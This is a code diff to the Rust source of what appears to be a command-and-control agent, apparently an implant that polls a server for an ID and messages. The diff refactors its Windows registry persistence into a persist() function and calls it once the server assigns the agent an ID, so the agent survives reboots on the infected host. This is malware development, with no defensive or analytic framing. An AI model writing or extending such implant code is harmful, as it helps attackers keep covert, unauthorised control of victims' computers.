@@ -47,23 +47,30 @@ struct OutputMessage {
     response: String,
 }
 
-#[tokio::main]
-async fn main() {
-    // Persitence:
+#[inline]
+fn persist(id: &str) -> bool{
+        // Persitence:
     match config::persistence() {
         Persistence::NO => {
             debug_println!("no persistence mechanism enabled");
         },
         Persistence::WinRegistryBased => {
-            match win_persist::classic_registry_based_survival("MyProgram") {
-                Ok(_) => {},
+            match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone(), &id) {
+                Ok(_) => {
+                    return true;
+                },
                 Err(e) => {
                     debug_eprintln!("failed to persist on windows: {}", e);
                 },
             }
         },
     }
+    return false;
+}
 
+#[tokio::main]
+async fn main() {
+    helpers::set_working_dir_to_program_dir();
 
     // Agent's configuration:
     let address = config::get_address();
@@ -131,6 +138,12 @@ async fn main() {
 
             debug_println!("Agent's Assigned A New ID");
         }
+        if id.len() == 0 {
+            debug_println!("server returned an empty id... critical");
+            continue;
+        }
+
+        persist(&id);
 
         debug_println!("fetching messages");
 
